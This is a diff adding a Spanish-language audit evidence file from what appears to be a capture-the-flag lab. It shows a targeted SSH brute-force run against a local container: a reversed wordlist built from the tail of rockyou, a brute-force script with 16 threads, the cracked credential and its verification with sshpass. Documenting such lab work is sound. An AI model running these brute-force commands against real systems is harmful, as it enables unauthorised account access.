@@ -1,0 +1,52 @@
+================================================================
+ Hedgehog — Evidencia de auditoría
+ Fase 3 — Credencial hallada: ataque dirigido a la cola de rockyou
+ Fecha (UTC) : 2026-10-19
+ Objetivo    : 172.17.0.2
+================================================================
+
+1. La contraseña no está en la cabecera de rockyou: está en la cola.
+
+   $ wc -l /usr/share/wordlists/rockyou.txt
+   14344392 /usr/share/wordlists/rockyou.txt
+
+   $ grep -n '3117548331' /usr/share/wordlists/rockyou.txt
+   14344302: 3117548331
+
+   Es decir, a 91 líneas del final (14.344.392 - 14.344.302 + 1 = 91).
+
+2. Detalle que explica por qué un grep exacto falla: la línea lleva un
+   espacio inicial.
+
+   $ sed -n '14344302p' /usr/share/wordlists/rockyou.txt | xxd
+   00000000: 2033 3131 3735 3438 3333 310a             3117548331.
+
+   $ grep -n '^3117548331$' /usr/share/wordlists/rockyou.txt
+   (sin resultados)
+
+3. Construcción de la lista invertida (últimas 500 entradas):
+
+   $ tail -n 500 /usr/share/wordlists/rockyou.txt | tac | sed 's/ //g' | sed '/^$/d' \
+       > wordlists/passwords_reversed_500.txt
+   $ wc -l wordlists/passwords_reversed_500.txt
+   497 wordlists/passwords_reversed_500.txt
+   $ nl -ba wordlists/passwords_reversed_500.txt | grep 3117548331
+   88  3117548331
+
+4. Ataque dirigido (reproducción):
+
+   $ python3 tools/ssh_brute.py -H 172.17.0.2 -u tails \
+       -P wordlists/passwords_reversed_500.txt -t 16
+   ...
+   [+] CREDENCIAL ENCONTRADA: tails / 3117548331
+   [*] 96 intentos en 21.6s (4/s)
+
+5. Verificación de la credencial:
+
+   $ sshpass -p '3117548331' ssh tails@172.17.0.2 id
+   uid=1002(tails) gid=1002(tails) groups=1002(tails)
+
+Conclusión: la contraseña es un número de 10 dígitos que sí figura en
+rockyou, pero en la última centena de la lista. Un barrido directo (de la
+posición 1 hacia delante) necesita más de 14,3 millones de intentos; el
+barrido inverso la alcanza en menos de 100.
